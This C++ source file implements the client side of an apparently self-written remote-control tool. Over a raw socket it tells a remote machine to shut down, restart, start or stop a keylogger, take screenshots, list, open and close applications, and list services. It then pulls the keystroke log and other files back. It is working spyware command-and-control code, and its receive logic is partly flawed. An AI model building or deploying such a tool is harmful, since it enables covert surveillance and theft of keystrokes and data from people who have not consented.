#include "client_socket.h"
#include <iostream>
#include <fstream>
#include <conio.h>


Client::Client(const std::string& serverIP, int port)
    : serverIP(serverIP), port(port), clientSocket(INVALID_SOCKET) {
    // Initialize Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
    }
}

Client::~Client() {
    // Cleanup
    if (clientSocket != INVALID_SOCKET) {
        closesocket(clientSocket);
    }
    WSACleanup();
}

bool Client::connectToServer() {
    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    // Setup sockaddr_in structure
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
    serverAddr.sin_port = htons(port);

    // Connect to server
    int result = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        std::cerr << "Unable to connect to server: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        return false;
    }

    return true;
}

bool Client::sendShutdownRequest() {
    const char* message = "shutdown";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Shutdown request sent successfully!" << std::endl;
    return true;
}

bool Client::sendRestartRequest() {
    const char* message = "restart";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Restart request sent successfully!" << std::endl;
    return true;
}

bool  Client::sendKeyloggerStartRequest(){
    const char* message = "startKeylogger";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    
    return true;
}

bool Client::sendKeyloggerOffRequest(){
    const char* message = "offKeylogger";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    sendFileCopyRequest("log.txt", "copy_log.txt");
    return true;
}
   
bool Client::sendScreenshotRequest()
{
    // Step 1: Send a request to the server for a screenshot
    const char* requestMessage = "screenshot";
    int sendResult = send(clientSocket, requestMessage, strlen(requestMessage), 0);
    if (sendResult == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }

    // // Step 2: Receive the screenshot data
    // char buffer[1024]; // Adjust size as necessary
    // std::ofstream outFile("received_screenshot.png", std::ios::binary);
    // if (!outFile) {
    //     std::cerr << "Error opening file for writing." << std::endl;
    //     return false;
    // }

    // // Assume the server sends the size first
    // int bytesReceived;
    // while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
    //     outFile.write(buffer, bytesReceived); // Write the received data to the file
    // }

    // if (bytesReceived < 0) {
    //     std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
    //     return false;
    // }

    // outFile.close();
    // std::cout << "Screenshot received and saved as received_screenshot.png" << std::endl;
    // return true;

    uint32_t dataSize;
    recv(clientSocket, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
    dataSize = ntohl(dataSize);

    std::vector<unsigned char> imageData(dataSize);
    recv(clientSocket, reinterpret_cast<char*>(imageData.data()), dataSize, 0);

    std::ofstream outFile("received_screenshot.jpg", std::ios::binary);
    outFile.write(reinterpret_cast<char*>(imageData.data()), imageData.size());
    outFile.close();

    std::cout << "Screenshot received and saved as 'received_screenshot.jpg'" << std::endl;
    return true;
}

// #define NOMINMAX
#undef min

bool Client::sendFileCopyRequest(const std::string& sourceFileName, const std::string& destinationFileName) {
    std::string request = "copy_file|" + sourceFileName + "|" + destinationFileName;
    
    // Send the request to the server
    if (send(clientSocket, request.c_str(), request.size(), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send file copy request: " << WSAGetLastError() << std::endl;
        return false;
    }

    // Receive the size of the file first
    uint32_t fileSize;
    int bytesReceived = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesReceived <= 0) {
        std::cerr << "Failed to receive file size: " << WSAGetLastError() << std::endl;
        return false;
    }
    fileSize = ntohl(fileSize); // Convert from network byte order to host byte order

    // Now receive the actual file data
    std::vector<char> fileData(fileSize);
    int totalBytesReceived = 0;

    while (totalBytesReceived < static_cast<int>(fileSize)) {
        std::size_t bytesToReceive = std::min(static_cast<std::size_t>(fileSize) - totalBytesReceived, sizeof(fileData));

        bytesReceived = recv(clientSocket, fileData.data() + totalBytesReceived, bytesToReceive, 0);
        if (bytesReceived <= 0) {
            std::cerr << "Failed to receive file data: " << WSAGetLastError() << std::endl;
            return false;
        }
        totalBytesReceived += bytesReceived;
    }

    // Save the received data to a file
    std::ofstream outputFile(destinationFileName, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Failed to create output file: " << destinationFileName << std::endl;
        return false;
    }
    outputFile.write(fileData.data(), fileSize);
    outputFile.close();

    std::cout << "File copied and saved as: " << destinationFileName << std::endl;
    return true;
}

bool Client::sendListOfAppRequest(){
    const char* message = "listApp";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    sendFileCopyRequest("applications.txt", "copy_applications.txt");
    return true;
}

bool Client::sendOpenAppRequest(const std::string& appName){
    std::string message = "openApp|" + appName;
    int result = send(clientSocket, message.c_str(), message.size(), 0);
    if (result == SOCKET_ERROR){
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    return true;
}

bool Client::sendCloseAppRequest(const std::string& appName){
    std::string message = "closeApp|" + appName;
    int result = send(clientSocket, message.c_str(), message.size(), 0);
    if (result == SOCKET_ERROR){
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    return true;
}

bool Client::sendListOfServiceRequest(){
    const char* message = "listService";
    int result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    sendFileCopyRequest("ListOfServices.txt", "copy_ListOfServices.txt");
    return true;
}



